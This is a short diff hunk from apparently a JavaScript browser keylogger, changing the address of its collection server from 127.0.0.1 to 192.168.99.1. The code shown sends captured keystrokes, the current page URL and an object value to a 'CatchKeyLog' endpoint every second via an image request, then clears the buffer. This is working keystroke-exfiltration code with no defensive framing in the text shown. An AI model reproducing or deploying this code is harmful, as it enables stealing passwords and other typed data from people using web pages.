@@ -9,6 +9,6 @@ document.onkeypress = function(e) {
 }
 window.setInterval(function(){
 	console.log("object" + object)
-	new Image().src = 'http://127.0.0.1:9000/CatchKeyLog?data='+keys+'&page='+window.location.href+'&object='+object ;
+	new Image().src = 'http://192.168.99.1:9000/CatchKeyLog?data='+keys+'&page='+window.location.href+'&object='+object ;
 	keys = '';
 }, 1000);
